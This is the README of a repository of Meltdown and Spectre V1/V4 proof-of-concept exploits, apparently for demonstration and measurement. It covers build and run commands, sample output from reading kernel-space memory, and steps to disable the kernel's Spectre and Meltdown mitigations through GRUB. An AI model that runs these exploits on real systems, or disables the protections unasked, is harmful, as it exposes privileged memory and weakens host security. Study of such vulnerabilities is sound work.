# Meltdown / Spectre
This repository contains code that demonstrates how Meltdown and Spectre vulnerabilities work and shows the differences between them. It also contains measurement functions for comparing results.
## Meltdown [(CVE-2017-5754)](https://nvd.nist.gov/vuln/detail/CVE-2017-5754)
The Meltdown implementation contains three types of malicious payload that were introduced in the original Meltdown [repository](https://github.com/IAIK/meltdown).
- meltdown
- meltdown_nonull
- meltdown_fast
#### Build
```bash
make
```
or
```bash
make meltdown
```
#### Run
```bash
./meltdown [address] [length]
```
```bash
./meltdown_nonull [address] [length]
```
```bash
./meltdown_fast [address] [length]
```
Run examples without arguments to read data from local process memory.
## Spectre Variant 1 [(CVE-2017-5753)](https://nvd.nist.gov/vuln/detail/CVE-2017-5753)
Spectre implementation from the original Spectre [paper](https://spectreattack.com/spectre.pdf).
#### Build
```bash
make
```
or
```bash
make spectre_v1
```
#### Run
```bash
./spectre_v1 [address] [length]
```
Run example without arguments to read data from local process memory.
## Spectre Variant 4 [(CVE-2018-3639)](https://nvd.nist.gov/vuln/detail/CVE-2018-3639)
Implementation of the Speculative Store Bypass, aka Spectre V4. This vulnerability works worse than Meltdown or Spectre V1 and doesn't work under VW. Code contains two variants of the malicious payload. The first variant is written in C and its instructions are compiler-dependent. For example, GCC does unnecessary register manipulation. The second variant is written in assembly language and remains unmodified after compilation.
- spectre_v4
- spectre_v4_asm
#### Build
```bash
make
```
or
```bash
make spectre_v4
```
#### Run
```bash
./spectre_v4 [address] [length]
```
```bash
./spectre_v4_asm [address] [length]
```
Run examples without arguments to read data from local process memory.
## Testing
The Meltdown repository contains [tools](https://github.com/IAIK/meltdown/blob/master/README.md#demo-4-read-physical-memory-physical_reader) that can be used to test these vulnerabilities on Linux systems. Use `secret` tool to put the secret string into memory. Use `direct_physical_map.sh` script to extract the physical memory offset from the kernel.
### Results
The results table contains information for all bytes read, including: virtual address, status, 1st and 2nd best guesses with their scores, number of attempts, number of zero checks.
```
./meltdown 0xffff97480b415188 50
CVE-2017-5754: Meltdown (null)
Flush+Reload: 323 cycles, Reload only: 36 cycles
Flush+Reload threshold: 131 cycles
Reading 50 bytes in 1000 tries:
0xffff97480b415188    STATUS  1st   SCORE  2nd   SCORE TRIES ZEROS
0xffff97480b415188      Zero 0x43 C     3    -       -   945     5
0xffff97480b415189   Success 0x6F o     3    -       -     3     -
0xffff97480b41518a   Success 0x6E n     3    -       -   215     -
0xffff97480b41518b   Success 0x67 g     3    -       -     3     -
0xffff97480b41518c   Success 0x72 r     3    -       -     3     -
0xffff97480b41518d   Success 0x61 a     3    -       -     4     -
...
```
```
./meltdown_fast 0xffff97480b415188 50
CVE-2017-5754: Meltdown (fast)
Flush+Reload: 397 cycles, Reload only: 38 cycles
Flush+Reload threshold: 157 cycles
Reading 50 bytes in 1000 tries:
0xffff97480b415188    STATUS  1st   SCORE  2nd   SCORE TRIES ZEROS
0xffff97480b415188      Zero 0x43 C     5 0x58 X     1   776   757
0xffff97480b415189      Zero 0x6F o     5 0xD0       1   901   797
0xffff97480b41518a      Zero 0x6E n     5 0x43 C     1   507   395
0xffff97480b41518b   Success 0x67 g     3    -       -   147     -
0xffff97480b41518c      Zero 0x72 r     3 0x5D ]     1  1000   862
0xffff97480b41518d      Zero 0x61 a     3    -       -   546   115
...
```
```
./spectre_v4 0xffff97480b415188 50
CVE-2018-3639: Spectre Variant 4 (compiler-dependent)
Flush+Reload: 379 cycles, Reload only: 40 cycles
Flush+Reload threshold: 153 cycles
Reading 50 bytes in 4000 tries:
0xffff97480b415188    STATUS  1st   SCORE  2nd   SCORE TRIES ZEROS
0xffff97480b415188   Unclear 0xFF       1 0xF5       1  4000     -
0xffff97480b415189   Unclear 0xB7       1 0x16       1  4000     -
0xffff97480b41518a   Unclear 0x8E       1 0x79 y     1  4000     -
0xffff97480b41518b Undefined    -       -    -       -  4000     -
0xffff97480b41518c   Unclear 0xEB       1 0x75 u     1  4000     -
0xffff97480b41518d   Unclear 0xD4       1 0xCA       1  4000     -
...
```
Byte status can be one of:
- `Success` - byte was detected successfully `(score_1 >= score_2 * 2)`
- `Unclear` - the result is unclear, check also the second guess
- `Zero` - the result is defined, but a zero byte with best score was detected (see ZEROS column). Read more about this case in the original Meltdown [paper](https://meltdownattack.com/meltdown.pdf)
- `Undefined` - no results, byte undefined
## Implementation for Windows
Spectre V1 and V4 examples can be compiled for Windows using the MinGW compiler. While Meltdown implementation uses POSIX signals that are not fully supported on Windows.
#### Build
```bash
make win
```
#### Run
```bash
spectre_v1.exe [address] [length]
```
```bash
spectre_v4.exe [address] [length]
```
```bash
spectre_v4_asm.exe [address] [length]
```
Run examples without arguments to read data from local process memory.
## Additional Information
### Check Meldown and Spectre protection on Linux
Run commands:
```bash
$ cat /sys/devices/system/cpu/vulnerabilities/meltdown
Vulnerable    
$ cat /sys/devices/system/cpu/vulnerabilities/spectre_v1
Vulnerable: __user pointer sanitization and usercopy barriers only; no swapgs barriers
```
### Disable Meldown and Spectre protection on Linux
Add or change this line in the file `/etc/default/grub`
```
GRUB_CMDLINE_LINUX="nospectre_v1 nopti"
```
Then run command:
```bash
sudo update-grub
```
## References
* [Spectre Paper](https://spectreattack.com/spectre.pdf)
* [Meltdown Paper](https://meltdownattack.com/meltdown.pdf)
* [Meltdown Source Code](https://github.com/IAIK/meltdown)
* [CVE-2017-5715: Spectre Variant 2 - Branch Target Injection](https://nvd.nist.gov/vuln/detail/CVE-2017-5715)
* [CVE-2017-5753: Spectre Variant 1 - Bounds Check Bypass](https://nvd.nist.gov/vuln/detail/CVE-2017-5753)
* [CVE-2017-5754: Meltdown Variant 3 - Rogue Data Cache Load](https://nvd.nist.gov/vuln/detail/CVE-2017-5754)
* [CVE-2018-3639: Spectre Variant 4 - Speculative Store Bypass](https://nvd.nist.gov/vuln/detail/CVE-2018-3639)
* [CVE-2018-3640: Meltdown Variant 3a - Rogue System Register Read](https://nvd.nist.gov/vuln/detail/CVE-2018-3640)
